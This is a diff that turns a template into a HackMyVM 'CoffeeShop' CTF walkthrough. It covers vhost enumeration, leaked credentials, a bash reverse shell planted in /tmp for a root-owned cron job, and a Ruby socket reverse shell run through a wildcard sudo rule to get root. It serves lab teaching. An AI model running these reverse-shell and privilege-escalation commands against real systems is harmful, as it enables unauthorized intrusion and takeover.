@@ -1,7 +1,7 @@
 ---
 layout: page
 title: "CoffeeShop - HackMyVM Writeup"
-subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
+subtitle: "Complete walkthrough detailing vhost enumeration, developer credential leak, cron-based shell injection, and sudo Ruby privilege escalation"
 permalink: /ctf/writeups/hackmyvm/coffeeshop/
 platform: hackmyvm
 machine_name: "CoffeeShop"
@@ -38,19 +38,27 @@ os: Linux
     </div>
     <div class="hmv-meta-col">
       <span class="hmv-meta-label">IP Address</span>
-      <span class="hmv-meta-val" style="font-family: monospace; font-size: 0.95rem;">DHCP</span>
+      <span class="hmv-meta-val" style="font-family: monospace; font-size: 0.95rem;">192.168.56.128</span>
     </div>
   </div>
 </div>
+
 ---
 
 ## 🧠 Attack Path Overview
 
 ```mermaid
 graph TD
-    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
-    B --> C["Privilege Escalation: Local Escalation"]
-    C --> D["Full System Compromise: Root/Administrator"]
+    A["Reconnaissance: Nmap Scan discovers port 80 and 22"] --> B["Vhost Enumeration: Discover dev.midnight.coffee subdomain"]
+    B --> C["Credential Leak: dev.midnight.coffee exposes developer:developer credentials"]
+    C --> D["Login: Authenticate to shop panel at midnight.coffee/shop/login.php"]
+    D --> E["Internal Credentials: Panel reveals tuna:1L0v3_TuN4_Very_Much for SSH"]
+    E --> F["Foothold: SSH login as user tuna"]
+    F --> G["Cron Discovery: /home/shopadmin/execute.sh runs /tmp/*.sh every minute as shopadmin"]
+    G --> H["Shell Upload: Write reverse shell .sh file into /tmp/"]
+    H --> I["Shopadmin Shell: Receive reverse shell as shopadmin from cron execution"]
+    I --> J["Privilege Escalation: Sudo rights to run ruby with arbitrary prefix script"]
+    J --> K["Root Shell: Execute Ruby reverse shell as root via sudo /usr/bin/ruby /tmp/shell.rb /opt/shop.rb"]
 ```
 
 > [!NOTE]
@@ -61,78 +69,156 @@ graph TD
 ## 🔍 Phase 1: Reconnaissance & Enumeration
 
 ### 1. Host Discovery & Port Scanning
-We begin by running a standard Nmap scan to discover open ports and running services:
+We start by scanning the target with Nmap:
 
 ```bash
-nmap -sC -sV -oN nmap.txt DHCP
+sudo nmap --min-rate=2000 -v -A -p- 192.168.56.128
 ```
 
 #### Open Ports:
-- **Port 80/tcp**: Web Server (Apache/Nginx)
-- **Port 22/tcp**: SSH (OpenSSH)
-- [Other open ports]
+```text
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+```
 
-### 2. Service Enumeration
-[Detail the enumeration steps, e.g., gobuster, nikto, smbclient, enum4linux, rpcclient]
+### 2. Virtual Host Enumeration
+The web server on port 80 redirects to `midnight.coffee`. We add it to our `/etc/hosts` file and enumerate subdomains:
 
 ```bash
-gobuster dir -u http://DHCP/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  -t 200 --append-domain -u http://midnight.coffee/
+```
+
+```text
+Found: dev.midnight.coffee Status: 200 [Size: 1738]
+```
+
+### 3. Dev Subdomain — Credential Leak
+Accessing `http://dev.midnight.coffee/` reveals hardcoded developer credentials:
+
+```text
+developer:developer
+```
+
+### 4. Shop Login — Internal Credentials
+We authenticate to the shop panel at `http://midnight.coffee/shop/login.php` using the discovered credentials.
+
+Inside the shop panel, we find a message containing SSH credentials for the `tuna` user:
+
+```text
+To login into the server use: tuna : 1L0v3_TuN4_Very_Much
 ```
 
 ---
 
-## 🚀 Phase 2: Vulnerability Analysis & Foothold
+## 🚀 Phase 2: Foothold as tuna
 
-### 1. Vulnerability Analysis
-- [State the vulnerability found and how it was discovered]
-- **CVE/CWE Reference**: [e.g., CVE-202X-XXXX]
-
-### 2. Exploitation & Initial Shell
-- [Detail the step-by-step exploitation process to gain a shell]
+We connect via SSH using the leaked credentials:
 
 ```bash
-# Example payload or exploit execution command
-python3 exploit.py -t http://DHCP/vulnerable-endpoint
+ssh tuna@192.168.56.128
 ```
 
-#### Capturing User Flag:
-```bash
-cat /home/*/user.txt
-# [User Flag Hash]
+```text
+tuna@coffee-shop:~$ whoami
+tuna
 ```
 
 ---
 
-## ⚡ Phase 3: Privilege Escalation
+## ⚡ Phase 3: Lateral Movement & Privilege Escalation
 
-### 1. Local Enumeration
-- [Detail tools and commands run, e.g., linpeas, winpeas, sudo -l, find SUID]
+### 1. Cron Job Discovery
+We run `linpeas.sh` for automated privilege escalation analysis. The crontab reveals a critical entry:
+
+```text
+* * * * * /bin/bash /home/shopadmin/execute.sh
+```
+
+Reading the script:
+```bash
+cat /home/shopadmin/execute.sh
+```
+```bash
+#!/bin/bash
+/bin/bash /tmp/*.sh
+```
+
+Every minute, a cron job running as `shopadmin` executes all `.sh` files inside `/tmp/`. Since `/tmp/` is writable by all users, we can plant a malicious reverse shell script.
+
+### 2. Shell Upload and Cron Trigger
+We write a bash reverse shell payload into `/tmp/`:
 
 ```bash
-# Check sudo permissions
+echo 'bash -i >& /dev/tcp/192.168.56.127/9999 0>&1' > /tmp/shell-1.sh
+```
+
+We start a listener:
+```bash
+nc -lnvp 9999
+```
+
+After up to one minute, the cron job executes our shell and we receive a connection:
+
+```text
+Connection received on 192.168.56.128
+id
+uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
+```
+
+We retrieve the user flag:
+```bash
+cat /home/shopadmin/user.txt
+```
+Output: `DR1NK1NG-C0FF33-4T-N1GHT`
+
+### 3. Root Privilege Escalation via Sudo Ruby
+We check `shopadmin`'s sudo permissions:
+
+```bash
 sudo -l
-
-# Search for SUID binaries
-find / -perm -4000 2>/dev/null
+```
+```text
+User shopadmin may run the following commands on coffee-shop:
+    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
 ```
 
-### 2. Local Privilege Escalation Path
-- [Step-by-step instructions to escalate privileges to root/administrator]
+The wildcard `*` in the sudo rule allows us to insert an arbitrary **prefix** script before `/opt/shop.rb`. This means we can supply a Ruby reverse shell as the first argument — Ruby will execute it first.
+
+We decode and write a Ruby reverse shell to `/tmp/`:
 
 ```bash
-# Example privilege escalation exploit or command
-sudo /usr/bin/binary -e 'exec /bin/sh'
+cat > /tmp/shell-2.rb << 'EOF'
+require 'socket'
+
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in 9998, '192.168.56.127'
+
+[0,1,2].each { |fd| syscall 33, s.fileno, fd }
+exec '/bin/sh -i'
+EOF
 ```
 
-#### Capturing Root Flag:
+We start another listener:
+```bash
+nc -lnvp 9998
+```
+
+We trigger the sudo exploit:
+```bash
+sudo /usr/bin/ruby /tmp/shell-2.rb /opt/shop.rb
+```
+
+We receive a root shell:
+```text
+Connection received on 192.168.56.128
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+We retrieve the root flag:
 ```bash
 cat /root/root.txt
-# [Root Flag Hash]
 ```
-
----
-
-## 🛡️ Key Takeaways & Mitigation
-1. **Input Sanitization**: Ensure all user inputs are validated and sanitized.
-2. **Principle of Least Privilege**: Restrict sudo permissions and remove unnecessary SUID bits.
-3. **Keep Software Updated**: Patch services to mitigate known CVEs.
+Output: `C4FF3331N-ADD1CCCTIONNNN`
